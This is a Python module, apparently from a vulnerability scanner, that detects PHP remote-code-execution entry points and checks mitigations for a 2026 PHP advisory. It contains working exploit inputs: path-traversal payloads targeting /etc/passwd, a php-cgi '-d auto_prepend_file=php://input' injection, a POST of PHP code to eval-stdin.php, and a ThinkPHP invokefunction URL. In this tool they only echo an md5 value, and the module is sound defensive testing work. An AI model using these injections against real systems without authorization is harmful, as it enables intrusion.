# -*- coding: utf-8 -*-
"""PHP2Shell 检测：发现 PHP 站点中可导致 getshell（远程代码执行 / 文件写入）的入口。

分两级：
1) 只读探测（默认开启）：phpinfo 暴露、php-cgi 参数注入(-s 源码泄露)、
   PHPUnit eval-stdin.php 可访问、Laravel Ignition、LFI / php://filter 包装器、
   PHP 版本 CVE 匹配 —— 均只做读取，不执行任何代码。
2) 无害执行验证（--php2shell-verify）：仅回显一个随机串的 md5 值来确认"可执行 PHP 代码"，
   **不执行系统命令、不写文件、不留下 webshell**。

说明：检测目的是为了在授权环境中证明"PHP -> Shell"链路是否成立，
请仅在自有或已授权站点上使用 --php2shell-verify。
"""

from __future__ import annotations

import hashlib
import re
import secrets
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlparse

from .models import Finding, WebInfo
from .utils import LOGGER, in_ranges, safe_text
from .vulndb import match_rules
from .webscan import http_request

# phpinfo 泄漏常见路径
PHPINFO_PATHS = [
    "/phpinfo.php", "/info.php", "/php_info.php", "/test.php", "/i.php",
    "/phpinfo.php5", "/admin/phpinfo.php", "/tools/phpinfo.php", "/public/phpinfo.php",
]

# PHPUnit eval-stdin.php（CVE-2017-9841）
EVAL_STDIN_PATHS = [
    "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php",
    "/phpunit/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/vendor/phpunit/src/Util/PHP/eval-stdin.php",
]

# Laravel Ignition（CVE-2021-3129）
IGNITION_PATHS = ["/_ignition/health-check", "/_ignition/execute-solution"]

# php-cgi 候选路径（CVE-2012-1823 / CVE-2024-4577 参数注入）
PHP_CGI_PATHS = [
    "/index.php", "/index.php5", "/php-cgi/php-cgi.exe", "/cgi-bin/php",
    "/cgi-bin/php-cgi", "/php-cgi.exe", "/cgi-bin/php5",
]

# ---------------- PHP2Shell（2026-10-21 官方公告，代号 php2shell） ----------------
# CVE-2026-109618（GHSA-w8hw-w9fx-j79w）：OOM 处理中断导致请求数据部分初始化，请求清理阶段
#   把无效数据当作有效数据使用，形成 Use After Free（CWE-416），可远程代码执行。
# CVE-2026-109619（GHSA-6wmf-4rv5-p3rp）：请求持有的内部状态在其内存被释放后仍存活，
#   同一 worker 处理后续请求时可能使用该失效状态。
# 影响全部 Web SAPI（PHP-FPM / mod_php / php-cgi / FrankenPHP / LiteSpeed），mod_php 风险最高。
# CVSS v4.0 9.2；修复版本 8.5.12 / 8.4.27 / 8.3.36 / 8.2.35；8.1 及更早版本无官方修复。
PHP2SHELL_2026_CVES = "CVE-2026-109618 / CVE-2026-109619"
PHP2SHELL_2026_REF = "https://www.php.net/archive/2026.php#2026-10-21-5"
PHP2SHELL_2026_RANGES = (
    ("8.5", "8.5.12"), ("8.4", "8.4.27"), ("8.3", "8.3.36"), ("8.2", "8.2.35"),
    ("0.0", "8.2"),  # 8.1 及更早版本官方不再提供修复（发行版 / LTS 厂商可能有向后移植补丁）
)
PHP2SHELL_2026_FIX = "8.5.12 / 8.4.27 / 8.3.36 / 8.2.35"

# phpinfo 中与这两个漏洞的"缓解措施是否落实"相关的配置项
PHPINFO_CONFIG_KEYS = (
    "memory_limit", "post_max_size", "upload_max_filesize",
    "session.upload_progress.enabled", "fatal_error_backtraces",
)

# 报告里展示的"已检测项"清单
READONLY_CHECKS = [
    f"PHP2Shell 版本核查（{PHP2SHELL_2026_CVES}，修复版本 {PHP2SHELL_2026_FIX}）",
    "PHP 版本 CVE 匹配（CVE-2019-11043 / CVE-2024-4577 / CVE-2012-1823 / CVE-2018-19518 / EOL-PHP）",
    "phpinfo 暴露与关键配置核查（memory_limit / post_max_size / session.upload_progress.enabled / fatal_error_backtraces）",
    "php-cgi 参数注入（?-s 源码泄露）",
    "PHPUnit eval-stdin.php 可访问（CVE-2017-9841）",
    "Laravel Ignition 组件（CVE-2021-3129）",
    "本地文件包含 LFI / php://filter 包装器",
]
VERIFY_CHECKS = [
    "php-cgi 参数注入 + php://input 回显 md5",
    "eval-stdin.php POST 回显 md5",
    "ThinkPHP invokefunction 回显 md5（仅调用 md5）",
]

# LFI 常见参数与载荷
LFI_PARAMS = [
    "file", "page", "include", "path", "template", "view", "doc", "url",
    "content", "load", "read", "dir", "show", "filename", "conf",
]
LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "....//....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
]
LFI_EVIDENCE = re.compile(r"root:[x*]:0:0:")
# -s 源码泄露的特征（php-cgi 参数注入）
SOURCE_DISCLOSURE = re.compile(
    r"&lt;\?php|<\?php\s|color:\s*#007700|<code><span|highlight_string|Sourcecode", re.IGNORECASE
)


def _php_version_from_headers(headers: Dict[str, str]) -> str:
    powered = str(headers.get("x-powered-by", ""))
    match = re.search(r"PHP[/\s]*([\d.]+)", powered, re.IGNORECASE)
    return match.group(1) if match else ""


def php2shell_2026_affected(version: str) -> bool:
    """判断 PHP 版本是否落在 CVE-2026-109618 / CVE-2026-109619 受影响区间。"""
    return bool(version) and in_ranges(version, PHP2SHELL_2026_RANGES)


def _phpinfo_value(text: str, key: str) -> str:
    """从 phpinfo 页面中解析指定配置项的值。"""
    m = re.search(rf">{re.escape(key)}</td>\s*<td[^>]*>\s*([^<]+)", text, re.IGNORECASE)
    if m:
        return m.group(1).strip()
    m = re.search(rf"{re.escape(key)}\s*[=:]\s*([^\s<,]+)", text, re.IGNORECASE)
    return m.group(1).strip() if m else ""


def _size_to_mb(value: str) -> Optional[float]:
    """把 '8M' / '512K' / '1G' / '0' 这类 php.ini 尺寸值换算成 MB。"""
    m = re.match(r"^([\d.]+)\s*([kmg])?b?$", (value or "").strip().lower())
    if not m:
        return None
    num = float(m.group(1))
    unit = m.group(2) or ""
    if unit == "k":
        return num / 1024
    if unit == "g":
        return num * 1024
    return num


def is_php_site(
    info: Optional[WebInfo] = None,
    headers: Optional[Dict[str, str]] = None,
    body_text: str = "",
    url: str = "",
) -> bool:
    """判断目标是否为 PHP 站点。"""
    headers = headers or {}
    blob = url or ""
    if info is not None:
        blob += " " + " ".join(
            [info.url, info.powered_by or "", info.server or "", " ".join(info.technologies)]
        )
        for key, value in (info.headers or {}).items():
            blob += f" {key}:{value}"
    for key, value in headers.items():
        blob += f" {key}:{value}"
    if re.search(r"php", blob, re.IGNORECASE):
        return True
    if re.search(r"\bphpsessid\b", blob, re.IGNORECASE):
        return True
    if re.search(r"\.php(\?|$)", url or "", re.IGNORECASE):
        return True
    return bool(re.search(r"""\.php["']""", body_text or "", re.IGNORECASE))


def _check_2026_mitigations(phpinfo_body: str, phpinfo_url: str, version: str) -> List[Finding]:
    """phpinfo 已暴露且版本受影响时，核查官方给出的缓解配置是否落实。"""
    out: List[Finding] = []

    sup = _phpinfo_value(phpinfo_body, "session.upload_progress.enabled")
    if sup and sup.lower() not in ("0", "off", "no", "false"):
        out.append(Finding(
            title="CVE-2026-109619 缓解措施未落实（session.upload_progress.enabled 仍开启）",
            severity="high", category="php2shell", target=phpinfo_url, cve="CVE-2026-109619",
            detail=f"官方建议关闭该特性以封堵已确认的利用路径，当前值为 {sup}；"
                   "注意这只能阻断已确认路径，不能替代升级",
            evidence=f"session.upload_progress.enabled = {sup}",
            remediation="在 php.ini / FPM pool / 服务器配置中设置 session.upload_progress.enabled=0"
                        "（不要用 ini_set 或 FPM .user.ini），并重启所有 PHP worker",
            reference=PHP2SHELL_2026_REF,
        ))

    mem = _phpinfo_value(phpinfo_body, "memory_limit")
    if mem and mem != "-1":
        out.append(Finding(
            title="CVE-2026-109618 缓解措施未落实（memory_limit 为有限值）",
            severity="medium", category="php2shell", target=phpinfo_url, cve="CVE-2026-109618",
            detail=f"当前 memory_limit={mem}。官方建议设为 -1 以消除攻击者可控的内存分配失败触发点"
                   "（底层分配失败仍可能到达漏洞路径，因此仍需升级）",
            evidence=f"memory_limit = {mem}",
            remediation="用 php_admin_value（FPM pool 或 Apache 配置）设置 memory_limit=-1 并确保应用无法覆盖；"
                        "不要用 RLIMIT_AS / RLIMIT_DATA 替代，反而会诱发漏洞路径",
            reference=PHP2SHELL_2026_REF,
        ))

    pms = _phpinfo_value(phpinfo_body, "post_max_size")
    size = _size_to_mb(pms)
    if pms and (size is None or size > 32):
        out.append(Finding(
            title="post_max_size 偏大或未限制，放大 CVE-2026-109618 攻击面",
            severity="low", category="php2shell", target=phpinfo_url, cve="CVE-2026-109618",
            detail=f"当前 post_max_size={pms}；官方建议不需要上传时设 8M、需要上传时不超过 32M，"
                   "并保持 upload_max_filesize 小于 post_max_size",
            evidence=f"post_max_size = {pms}",
            remediation="调低 post_max_size（8M / 32M），并在 Web 服务器或代理层限制解码后的请求大小、"
                        "输入字段数、multipart 分片数与嵌套深度",
            reference=PHP2SHELL_2026_REF,
        ))

    if version.startswith("8.5"):
        feb = _phpinfo_value(phpinfo_body, "fatal_error_backtraces")
        if feb and feb.lower() not in ("0", "off", "no", "false"):
            out.append(Finding(
                title="CVE-2026-109619 缓解措施未落实（8.5 上 fatal_error_backtraces 未关闭）",
                severity="medium", category="php2shell", target=phpinfo_url, cve="CVE-2026-109619",
                detail=f"PHP 8.5 上官方建议设置 fatal_error_backtraces=0 以封堵已确认的 fatal backtrace 路径，"
                       f"当前值为 {feb}",
                evidence=f"fatal_error_backtraces = {feb}",
                remediation="设置 fatal_error_backtraces=0 并重启所有 worker；同时修复可被攻击者触发的 "
                            "fatal error 与执行超时",
                reference=PHP2SHELL_2026_REF,
            ))
    return out


def scan_php2shell(
    host: str,
    port: int,
    use_tls: bool,
    timeout: float,
    base_url: str,
    info: Optional[WebInfo] = None,
    server_hostname: Optional[str] = None,
    verify: bool = False,
) -> Tuple[List[Finding], Dict]:
    """对单个 Web 入口做 PHP2Shell 检测。

    返回 (发现列表, 摘要字典)，摘要用于报告中的 PHP2Shell 章节。
    """
    findings: List[Finding] = []
    summary: Dict = {
        "url": base_url,
        "vhost": getattr(info, "vhost", "") or "",
        "php": False,
        "php_version": "",
        "verified": bool(verify),
        "checks": list(READONLY_CHECKS) + (list(VERIFY_CHECKS) if verify else []),
        "findings": [],
    }

    def req(path: str, method: str = "GET", body: Optional[bytes] = None,
            headers: Optional[Dict[str, str]] = None) -> Tuple[int, Dict[str, str], str]:
        status, hdrs, raw, _err = http_request(
            host, port, path, method=method, use_tls=use_tls, timeout=timeout,
            headers=headers, max_body=8192, server_hostname=server_hostname, body=body,
        )
        return status, hdrs, safe_text(raw, 8192)

    root_path = urlparse(base_url).path or "/"
    status, headers, text = req(root_path or "/")
    if not status:
        return findings, summary

    # 无论是否识别为 PHP 站点，都执行全量检测：
    # 很多 PHP 站点会关闭 expose_php、改写扩展名或用反代隐藏特征，但从入口上仍可被利用
    summary["php"] = is_php_site(info, headers, text, base_url)
    if summary["php"]:
        LOGGER.info("  检测到 PHP 站点，开始 PHP2Shell 检测：%s", base_url)
    else:
        LOGGER.info("  未识别为 PHP 站点，仍执行 PHP2Shell 全量检测：%s", base_url)

    # 基线：判断站点是否对所有路径都返回 200（避免误报）
    rand_path = f"/__vulnscanner_{secrets.token_hex(4)}__.php"
    bs, _bh, btext = req(rand_path)
    catch_all = bs == 200 and btext.strip() == text.strip()
    if catch_all:
        LOGGER.debug("  站点对任意路径均返回 200，存在性类检测将降级处理")

    def hit(status_code: int, body_text: str, pattern: Optional[re.Pattern] = None) -> bool:
        if status_code != 200:
            return False
        if catch_all and body_text.strip() == text.strip():
            return False
        return True if pattern is None else bool(pattern.search(body_text))

    # ---------- 1) phpinfo 暴露（版本与配置的第二来源） ----------
    phpinfo_body = ""
    phpinfo_url = ""
    for path in PHPINFO_PATHS:
        s, _h, body = req(path)
        if hit(s, body) and re.search(r"phpinfo\(\)|PHP Version", body, re.I):
            phpinfo_body = body
            phpinfo_url = f"{base_url}{path}"
            findings.append(Finding(
                title="phpinfo 信息页面暴露", severity="medium", category="php2shell",
                target=phpinfo_url,
                detail="phpinfo 会泄露绝对路径、扩展、环境变量、配置（如 disable_functions）等，常被用于构造 getshell",
                evidence=body[:200], remediation="删除或禁止访问 phpinfo.php 等探针文件",
            ))
            break

    # ---------- 2) PHP 版本 -> CVE（含 PHP2Shell: CVE-2026-109618 / CVE-2026-109619） ----------
    version = _php_version_from_headers(headers) or _php_version_from_headers(getattr(info, "headers", {}) or {})
    if not version and phpinfo_body:
        m = re.search(r"PHP Version\s*([\d.]+)", phpinfo_body, re.I)
        version = m.group(1) if m else ""
    if version:
        summary["php_version"] = version
        for rule in match_rules("php", version):
            detail = f"检测到 PHP {version}，命中已知漏洞规则"
            if rule.id in ("CVE-2026-109618", "CVE-2026-109619"):
                eol = in_ranges(version, (("0.0", "8.2"),))
                detail = (
                    f"检测到 PHP {version}。PHP 官方 2026-10-21 公告（代号 php2shell）：该版本处于受影响区间"
                    "（8.5.x<8.5.12、8.4.x<8.4.27、8.3.x<8.3.36、8.2.x<8.2.35"
                    + ("，且该分支已 EOL、官方不再提供修复，需依赖发行版/LTS 厂商向后移植补丁）"
                       if eol else f"，修复版本为 {PHP2SHELL_2026_FIX}）")
                    + "。未认证攻击者可通过特制 POST 请求触发 Use After Free（CWE-416）实现远程代码执行，"
                      "CVSS v4.0 9.2；PHP-FPM / mod_php / php-cgi / FrankenPHP / LiteSpeed 全部 SAPI 均受影响"
                )
            findings.append(Finding(
                title=rule.name, severity=rule.severity, category="php2shell", target=base_url,
                cve=rule.id, detail=detail,
                evidence=str(headers.get("x-powered-by", "")) or f"phpinfo: PHP Version {version}",
                remediation=rule.remediation, reference=rule.reference,
            ))
        # phpinfo 暴露时，核查官方给出的缓解配置是否落实
        if phpinfo_body:
            findings.extend(_check_2026_mitigations(phpinfo_body, phpinfo_url, version))
    elif summary["php"] or phpinfo_url:
        findings.append(Finding(
            title="无法获取 PHP 版本，不能排除 PHP2Shell（CVE-2026-109618 / CVE-2026-109619）",
            severity="info", category="php2shell", target=base_url, cve=PHP2SHELL_2026_CVES,
            detail="响应未暴露 PHP 版本（expose_php 可能已关闭）且未发现 phpinfo，无法判断是否落在受影响区间"
                   f"（8.5.x<8.5.12、8.4.x<8.4.27、8.3.x<8.3.36、8.2.x<8.2.35、8.1 及更早）",
            remediation="在服务器上执行 php -v（或 rpm -qa / dpkg -l | grep php）核对版本并尽快升级；"
                        "该漏洞未认证即可触发，隐藏版本号不能提供保护",
            reference=PHP2SHELL_2026_REF,
        ))

    # SAPI 风险提示：官方评估 mod_php（Apache）风险最高，未认证请求可在应用代码执行前触发
    server_hdr = str(headers.get("server", "")) or getattr(info, "server", "") or ""
    if summary["php"] and "apache" in server_hdr.lower():
        findings.append(Finding(
            title="可能为 Apache mod_php 部署（PHP2Shell 风险最高的场景）", severity="info",
            category="php2shell", target=base_url, cve=PHP2SHELL_2026_CVES,
            detail="PHP 官方指出 mod_php 风险最高：演示利用可在应用代码执行之前、仅凭未认证请求触发漏洞；"
                   "PHP-FPM / php-cgi / FrankenPHP / LiteSpeed 同样受影响",
            evidence=f"Server: {server_hdr}",
            remediation="优先迁移到 PHP-FPM 并及时升级 PHP；必须使用 mod_php 时应第一时间打补丁",
            reference=PHP2SHELL_2026_REF,
        ))

    # ---------- 3) php-cgi 参数注入（-s 源码泄露，CVE-2012-1823 / CVE-2024-4577） ----------
    cgi_hit = False
    for path in PHP_CGI_PATHS:
        s, _h, body = req(f"{path}?-s")
        if hit(s, body, SOURCE_DISCLOSURE):
            cgi_hit = True
            findings.append(Finding(
                title="PHP-CGI 参数注入可泄露源码（可发展为远程代码执行）", severity="critical",
                category="php2shell", target=f"{base_url}{path}?-s",
                cve="CVE-2012-1823 / CVE-2024-4577",
                detail="请求 ?-s 返回了 PHP 源码，说明 php-cgi 会把查询串当作 CGI 参数解析；"
                       "同样的注入点配合 -d auto_prepend_file=php://input 即可执行任意 PHP 代码（PHP2Shell）",
                evidence=body[:200],
                remediation="升级 PHP（>=8.3.8/8.2.20/8.1.29，或 >=5.4.3/5.3.13），"
                            "不要将 php-cgi/php-cgi.exe 直接对外，改用 php-fpm 或 mod_php，并在反向代理层过滤 ?-d 类参数",
                reference="https://nvd.nist.gov/vuln/detail/CVE-2024-4577",
            ))
            break
    if not cgi_hit:
        for path in PHP_CGI_PATHS:
            s, _h, body = req(path)
            if hit(s, body) and re.search(r"php[- ]?cgi|No input file specified|PHP/\d", body, re.I):
                findings.append(Finding(
                    title="存在 php-cgi 入口，建议确认是否受参数注入影响", severity="medium",
                    category="php2shell", target=f"{base_url}{path}",
                    detail="检测到 php-cgi 相关入口，存在 CVE-2012-1823 / CVE-2024-4577 参数注入风险",
                    evidence=body[:160],
                    remediation="升级 PHP 并改用 php-fpm；使用 --php2shell-verify 可做无害验证",
                ))
                break

    # ---------- 4) PHPUnit eval-stdin.php（CVE-2017-9841） ----------
    for path in EVAL_STDIN_PATHS:
        s, _h, body = req(path)
        if s == 200 and not (catch_all and body.strip() == text.strip()):
            findings.append(Finding(
                title="PHPUnit eval-stdin.php 可访问（可直接执行 PHP 代码）", severity="critical",
                category="php2shell", target=f"{base_url}{path}", cve="CVE-2017-9841",
                detail="该文件会 eval(POST 内容)，向其 POST PHP 代码即可在服务器上执行，是典型的 PHP2Shell 入口",
                evidence=body[:160] or "(200 OK，无输出)",
                remediation="删除 vendor 目录对外访问（不要将 vendor/ 暴露在 Web 根目录下）",
                reference="https://nvd.nist.gov/vuln/detail/CVE-2017-9841",
            ))
            break

    # ---------- 5) Laravel Ignition（CVE-2021-3129） ----------
    for path in IGNITION_PATHS:
        s, _h, body = req(path)
        if hit(s, body) and re.search(r"ignition|can_execute|Laravel|solution", body, re.I):
            findings.append(Finding(
                title="Laravel Ignition 组件存在（可能存在 CVE-2021-3129 远程代码执行）",
                severity="high", category="php2shell", target=f"{base_url}{path}", cve="CVE-2021-3129",
                detail="Ignition 的 execute-solution 接口可写日志文件并通过 viewFile 包含执行，"
                       "进而 getshell；仅在 debug 模式下可利用",
                evidence=body[:160],
                remediation="升级 laravel/ignition 至 2.5.2+，生产环境关闭 APP_DEBUG 并禁止 /_ignition 对外",
                reference="https://nvd.nist.gov/vuln/detail/CVE-2021-3129",
            ))
            break

    # ---------- 6) LFI / php://filter（可读文件 -> 配合日志/FilterChain getshell） ----------
    lfi_found = False
    for param in LFI_PARAMS:
        if lfi_found:
            break
        for payload in LFI_PAYLOADS:
            sep = "&" if "?" in root_path else "?"
            s, _h, body = req(f"{root_path}{sep}{param}={payload}")
            if s == 200 and LFI_EVIDENCE.search(body):
                findings.append(Finding(
                    title="本地文件包含（LFI）可读取系统文件", severity="high", category="php2shell",
                    target=f"{base_url}{sep}{param}={payload}",
                    detail=f"参数 {param} 可读取 /etc/passwd；LFI 常被用于包含日志/会话文件写入 shell，"
                           "或结合 php://filter 链转为远程代码执行",
                    evidence=body[:200],
                    remediation="禁止用户可控参数进入 include/require，改用白名单映射",
                ))
                lfi_found = True
                break
    if not lfi_found:
        sep = "&" if "?" in root_path else "?"
        s, _h, body = req(f"{root_path}{sep}file=php://filter/convert.base64-encode/resource=index.php")
        if s == 200:
            try:
                import base64

                decoded = base64.b64decode(re.sub(r"\s+", "", body)[:4096] + "==").decode(
                    "utf-8", errors="ignore"
                )
            except Exception:  # noqa: BLE001
                decoded = ""
            if "<?php" in decoded:
                findings.append(Finding(
                    title="支持 php://filter 包装器（可被用于包含/读取源码）", severity="high",
                    category="php2shell", target=f"{base_url}{sep}file=php://filter/...",
                    detail="php://filter 可用于读取源码，配合 filter chain 或日志文件包含可转为代码执行",
                    evidence=decoded[:160],
                    remediation="过滤 php:// 等流包装器，禁止用户可控路径进入文件包含函数",
                ))

    # ---------- 7) 无害执行验证（默认关闭） ----------
    if verify:
        findings.extend(_verify_rce(host, port, use_tls, timeout, base_url,
                                    root_path, server_hostname, req, hit, text))
    elif findings:
        findings.append(Finding(
            title="如需确认是否真的可执行 PHP 代码，请加 --php2shell-verify", severity="info",
            category="php2shell", target=base_url,
            detail="该开关只回显随机字符串的 md5，不会执行系统命令、不会写入文件",
        ))
    summary["findings"] = [
        {"title": f.title, "severity": f.severity, "cve": f.cve, "detail": f.detail}
        for f in findings
    ]
    return findings, summary


def _verify_rce(
    host: str,
    port: int,
    use_tls: bool,
    timeout: float,
    base_url: str,
    root_path: str,
    server_hostname: Optional[str],
    req,
    hit,
    home_text: str,
) -> List[Finding]:
    """无害验证：仅 echo md5(随机串)，确认"可以执行 PHP 代码"。"""
    results: List[Finding] = []
    token = secrets.token_hex(8)
    expect = hashlib.md5(token.encode()).hexdigest()
    payload = f"<?php echo md5('{token}'); exit; ?>".encode()

    def confirmed(body_text: str) -> bool:
        return expect in body_text

    # a) php-cgi 参数注入 -> php://input
    for path in PHP_CGI_PATHS:
        query = f"{path}?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp%3a//input"
        s, _h, body = req(query, method="POST", body=payload)
        if s and confirmed(body):
            results.append(Finding(
                title="PHP-CGI 远程代码执行已验证（PHP2Shell 成立）", severity="critical",
                category="php2shell", target=f"{base_url}{query}", cve="CVE-2012-1823 / CVE-2024-4577",
                detail=f"已通过 php://input 执行 echo md5('{token}') 并得到正确结果 {expect}；"
                       "该入口等价于可直接执行任意 PHP 代码并写入 webshell（本次仅回显，未写入任何文件）",
                evidence=body[:200],
                remediation="立即升级 PHP / 下线 php-cgi 对外入口，临时处置：在反向代理过滤含 '-d ' 的查询串",
                reference="https://nvd.nist.gov/vuln/detail/CVE-2024-4577",
            ))
            break

    # b) eval-stdin.php
    for path in EVAL_STDIN_PATHS:
        s, _h, body = req(path, method="POST", body=payload)
        if s and confirmed(body):
            results.append(Finding(
                title="PHPUnit eval-stdin.php 远程代码执行已验证", severity="critical",
                category="php2shell", target=f"{base_url}{path}", cve="CVE-2017-9841",
                detail=f"POST PHP 代码被执行，md5('{token}') = {expect}；可直接用于写入 webshell",
                evidence=body[:200],
                remediation="立即删除或禁止访问该路径，vendor 目录不应放在 Web 根目录",
                reference="https://nvd.nist.gov/vuln/detail/CVE-2017-9841",
            ))
            break

    # c) ThinkPHP invokefunction（仅调用 md5，不做命令执行）
    tp_url = ("/index.php?s=/Index/\\think\\app/invokefunction"
              f"&function=call_user_func_array&vars[0]=md5&vars[1][]={token}")
    s, _h, body = req(tp_url)
    if s and confirmed(body):
        results.append(Finding(
            title="ThinkPHP 远程代码执行已验证（invokefunction）", severity="critical",
            category="php2shell", target=f"{base_url}{tp_url}",
            detail=f"框架未修复的历史 RCE 入口可执行任意函数，本次仅调用 md5 验证（{expect}）",
            evidence=body[:200],
            remediation="升级 ThinkPHP 至官方最新安全版本，关闭调试模式",
        ))

    if not results:
        results.append(Finding(
            title="PHP2Shell 无害验证未成功（未确认可执行代码）", severity="info",
            category="php2shell", target=base_url,
            detail="已尝试 php-cgi 参数注入 / eval-stdin / ThinkPHP invokefunction 三类入口，"
                   f"均未得到预期回显 md5('{token}')；不代表绝对安全，建议结合版本与配置人工核查",
        ))
    return results
